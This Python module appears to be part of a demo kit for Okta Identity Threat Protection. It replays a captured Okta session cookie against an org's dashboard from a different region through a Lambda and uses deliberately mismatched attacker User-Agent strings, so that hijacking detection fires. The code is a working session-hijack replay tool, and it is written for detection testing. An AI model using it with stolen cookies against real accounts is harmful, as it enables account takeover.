#!/usr/bin/env python3
"""
session_replayer.py - Attacker-side session cookie replay for Okta ITP demos.

Architecture
------------
This module simulates the "attacker" half of a session hijacking attack. The
companion module ``session_authenticator.py`` (the "victim") logs in via
Playwright and captures a live session cookie. This module then *replays* that
cookie from a completely different network context -- different IP, User-Agent,
and (when run in Lambda) different geographic region -- which is exactly the
signal pattern that Okta Identity Threat Protection (ITP) uses to detect
session hijacking.

Three execution modes
~~~~~~~~~~~~~~~~~~~~~
1. **Standalone CLI** -- ``python3 -m itp.session_replayer --cookie ... --domain ...``
   Useful for local testing or running directly on an EC2 instance.

2. **Importable module** -- called by ``trigger_itp_demo.py`` in *real* mode.
   The orchestrator authenticates (victim), extracts the cookie, then calls
   ``replay_cookie()`` either directly or by invoking the Lambda (mode 3).

3. **AWS Lambda handler** -- deployed to a *different AWS region* (e.g.
   eu-west-1) so that the replay originates from a geographically distinct IP.
   ``trigger_itp_demo.py`` invokes this Lambda via ``boto3``.  The Lambda
   environment is minimal (no ``requests`` library), which is why the urllib
   fallback exists (see note below).

Why redirect-following is disabled
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
When replaying a session cookie against ``/app/UserHome``, Okta may respond
with a 302 redirect (to the login page, a dashboard, or an error endpoint).
We intentionally disable redirect-following so we can inspect the *first*
response:

- **HTTP 200** -- Okta accepted the cookie and rendered the dashboard. The
  session is (still) valid, and ITP will evaluate the context mismatch
  asynchronously.
- **HTTP 302** -- Okta acknowledged the cookie but redirected. The Location
  header tells us *where* (login page = session rejected; dashboard = success).
  Following the redirect would lose this diagnostic information.
- **HTTP 401** -- Okta rejected the cookie outright, meaning the session was
  already revoked (possibly by a prior ITP detection or admin action).

If we followed redirects automatically, we would land on a final page and lose
visibility into Okta's initial decision, making it harder to diagnose whether
the demo trigger actually worked.

Usage (standalone):
    python3 -m itp.session_replayer \\
        --cookie "IDX_COOKIE_VALUE" \\
        --domain "yourorg.okta.com"

Usage (Lambda):
    # Invoked by trigger_itp_demo.py with payload:
    # {"cookie_name": "idx", "cookie": "...", "okta_domain": "yourorg.okta.com"}
"""

import os
import sys
import json
import argparse
from typing import Dict

# ---------------------------------------------------------------------------
# HTTP library selection: requests vs urllib fallback
#
# The ``requests`` library provides a cleaner API (cookies dict, easy header
# setting, allow_redirects flag).  However, when this module runs inside an
# AWS Lambda function, ``requests`` may not be available unless bundled in a
# Lambda layer.  To keep the Lambda deployment package minimal (just this
# single .py file), we fall back to the stdlib ``urllib`` which is always
# present in the Lambda Python runtime.
# ---------------------------------------------------------------------------
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    import urllib.request
    import urllib.error
    import http.cookiejar


# ---------------------------------------------------------------------------
# Attacker User-Agent strings
#
# These are deliberately chosen to be *different* from the victim's browser
# fingerprint (which is typically macOS + Chrome, set by the Playwright-based
# session_authenticator).  The mismatch between the victim's UA and the
# attacker's UA is one of the signals Okta ITP evaluates when scoring session
# hijacking risk.  Each string represents a different OS/browser combination
# to maximize the apparent difference.
# ---------------------------------------------------------------------------
ATTACKER_USER_AGENTS = [
    # Windows 10 + Chrome 121 -- different OS family from macOS victim
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/121.0.0.0 Safari/537.36"
    ),
    # Linux + Firefox 122 -- different OS *and* different browser engine
    (
        "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) "
        "Gecko/20100101 Firefox/122.0"
    ),
    # Windows 10 + Edge 121 -- yet another browser identity
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
    ),
]


def replay_cookie(cookie_name: str, cookie_value: str, okta_domain: str,
                  user_agent_index: int = 0) -> Dict:
    """
    Replay a session cookie against Okta from the current context.

    The fact that this runs from a different IP and User-Agent than the
    original session is what triggers Okta's session hijacking detection.

    Args:
        cookie_name: Cookie name (typically "idx" for the Okta Identity
            Engine session cookie, or "sid" for Classic Engine orgs).
        cookie_value: The raw session cookie value captured by the
            session_authenticator during the victim's login.
        okta_domain: Full Okta domain (e.g., "yourorg.okta.com").
        user_agent_index: Which attacker UA string to use (0-2). Wraps
            around via modulo so out-of-range values are safe.

    Returns:
        Dict with keys: status ("success" or "error"), http_code,
        redirect_url, content_length, and optionally "error" message.
    """
    # Target the Okta user dashboard -- this is an authenticated page that
    # requires a valid session cookie.  Okta will evaluate the request
    # context (IP, UA, device fingerprint) against the original session.
    url = f"https://{okta_domain}/app/UserHome"
    # Select the attacker UA, wrapping with modulo for safety
    ua = ATTACKER_USER_AGENTS[user_agent_index % len(ATTACKER_USER_AGENTS)]

    print(f"  Replaying {cookie_name} cookie against {okta_domain}...")
    print(f"  User-Agent: {ua[:60]}...")
    print(f"  Target URL: {url}")

    # Dispatch to the appropriate HTTP implementation based on what is
    # available in this runtime (see library selection note at top of file).
    if HAS_REQUESTS:
        return _replay_with_requests(url, cookie_name, cookie_value, okta_domain, ua)
    else:
        return _replay_with_urllib(url, cookie_name, cookie_value, okta_domain, ua)


def _replay_with_requests(url: str, cookie_name: str, cookie_value: str,
                          okta_domain: str, user_agent: str) -> Dict:
    """Replay using the ``requests`` library (preferred when available)."""
    try:
        response = requests.get(
            url,
            cookies={cookie_name: cookie_value},
            headers={
                "User-Agent": user_agent,
                # Mimic a real browser's Accept headers so Okta does not
                # short-circuit the request as a non-browser API call.
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
            },
            # Do NOT follow redirects -- we need to inspect Okta's initial
            # response code and Location header to understand whether the
            # session was accepted, redirected, or rejected.  See module
            # docstring for full rationale.
            allow_redirects=False,
            timeout=15,
        )

        result = {
            "status": "success",
            "http_code": response.status_code,
            "redirect_url": response.headers.get("Location", ""),
            "content_length": len(response.content),
        }

        # Interpret the HTTP status code for operator feedback:
        # 200 = Okta rendered the dashboard (cookie valid, context noted)
        # 302 = Okta redirected (check Location to see where -- login page
        #        means session invalid; dashboard means session valid)
        # 401 = Session explicitly rejected (already revoked or expired)
        if response.status_code in (200, 302):
            print(f"  ✅ Cookie accepted (HTTP {response.status_code})")
            if response.status_code == 302:
                print(f"     Redirect: {result['redirect_url']}")
        elif response.status_code == 401:
            print(f"  ⚠️  Cookie rejected (HTTP 401) — session may have been revoked")
        else:
            print(f"  ⚠️  Unexpected response: HTTP {response.status_code}")

        return result

    except Exception as e:
        return {"status": "error", "error": str(e)}


def _replay_with_urllib(url: str, cookie_name: str, cookie_value: str,
                        okta_domain: str, user_agent: str) -> Dict:
    """
    Replay using stdlib ``urllib`` -- the fallback for AWS Lambda environments
    where the ``requests`` library is not installed.  Functionally identical
    to ``_replay_with_requests`` but uses only Python standard library.
    """
    try:
        req = urllib.request.Request(url)
        req.add_header("User-Agent", user_agent)
        req.add_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
        # urllib does not have a cookies dict parameter, so we set the
        # Cookie header directly in name=value format.
        req.add_header("Cookie", f"{cookie_name}={cookie_value}")

        # urllib follows redirects by default.  We override the redirect
        # handler to suppress that behavior (same rationale as
        # allow_redirects=False in the requests path).
        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, req, fp, code, msg, headers, newurl):
                # Returning None tells urllib to stop -- do not follow.
                return None

        opener = urllib.request.build_opener(NoRedirect)

        try:
            response = opener.open(req, timeout=15)
            http_code = response.getcode()
            content_length = len(response.read())
            redirect_url = ""
        except urllib.error.HTTPError as e:
            # urllib raises HTTPError for 3xx/4xx/5xx when redirects are
            # suppressed.  The error object still carries the status code
            # and headers, so we extract what we need.
            http_code = e.code
            content_length = 0
            redirect_url = e.headers.get("Location", "")

        result = {
            "status": "success",
            "http_code": http_code,
            "redirect_url": redirect_url,
            "content_length": content_length,
        }

        print(f"  Cookie replay result: HTTP {http_code}")
        return result

    except Exception as e:
        return {"status": "error", "error": str(e)}


# ---------------------------------------------------------------------------
# AWS Lambda Handler
#
# When deployed as a Lambda function (see terraform/itp_session_replayer.tf),
# AWS invokes ``handler(event, context)`` directly.  The Lambda is typically
# deployed in a region far from the victim (e.g. eu-west-1 while the victim
# is in us-east-2) to ensure the replay originates from a different IP and
# geographic location, maximizing the ITP risk signal.
# ---------------------------------------------------------------------------

def handler(event, context):
    """
    AWS Lambda entry point for cross-region cookie replay.

    Event payload:
        {
            "cookie_name": "idx",          -- session cookie name
            "cookie": "COOKIE_VALUE",      -- raw cookie value from victim
            "okta_domain": "yourorg.okta.com",
            "user_agent_index": 0          -- optional, defaults to 0
        }

    Returns the replay result dict, augmented with Lambda metadata
    (region and request ID) for traceability in CloudWatch logs.
    """
    cookie_name = event.get("cookie_name", "idx")
    cookie_value = event.get("cookie")
    okta_domain = event.get("okta_domain")
    ua_index = event.get("user_agent_index", 0)

    if not cookie_value or not okta_domain:
        return {
            "status": "error",
            "error": "cookie and okta_domain are required"
        }

    result = replay_cookie(cookie_name, cookie_value, okta_domain, ua_index)

    # Annotate the result with Lambda execution metadata so the caller
    # (trigger_itp_demo.py) can confirm which region the replay came from.
    if context:
        # The function ARN format is arn:aws:lambda:<region>:<account>:function:<name>
        result["lambda_region"] = context.invoked_function_arn.split(":")[3]
        result["lambda_request_id"] = context.aws_request_id

    return result


# ---------------------------------------------------------------------------
# Standalone CLI
#
# Allows running the replayer directly from the command line, useful for:
# - Local testing without Lambda infrastructure
# - Running on a remote EC2 instance in a different region
# - Quick manual verification of a captured cookie
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Replay Okta session cookie from attacker context"
    )
    # --cookie-name: which cookie to replay. "idx" is the standard Okta
    # Identity Engine session cookie; "sid" is used by Classic Engine orgs.
    parser.add_argument("--cookie-name", default="idx", help="Cookie name (default: idx)")
    # --cookie: the raw cookie value captured from the victim's browser
    # session by session_authenticator.py (or manually from DevTools).
    parser.add_argument("--cookie", required=True, help="Session cookie value")
    # --domain: the Okta org's FQDN, used to build the target URL.
    parser.add_argument("--domain", required=True, help="Okta domain (e.g., yourorg.okta.com)")
    # --ua-index: selects which attacker User-Agent string to use from the
    # ATTACKER_USER_AGENTS list (0 = Windows Chrome, 1 = Linux Firefox,
    # 2 = Windows Edge).
    parser.add_argument("--ua-index", type=int, default=0, help="User-Agent index (0-2)")
    # --output: optionally write the JSON result to a file for downstream
    # consumption (e.g., by a CI pipeline or monitoring script).
    parser.add_argument("--output", help="Write result JSON to file")

    args = parser.parse_args()

    result = replay_cookie(args.cookie_name, args.cookie, args.domain, args.ua_index)

    if args.output:
        with open(args.output, 'w') as f:
            json.dump(result, f, indent=2)

    print(f"\nResult: {json.dumps(result, indent=2)}")
    # Exit 0 on success, 1 on error so callers can check $?.
    sys.exit(0 if result["status"] == "success" else 1)


if __name__ == "__main__":
    main()
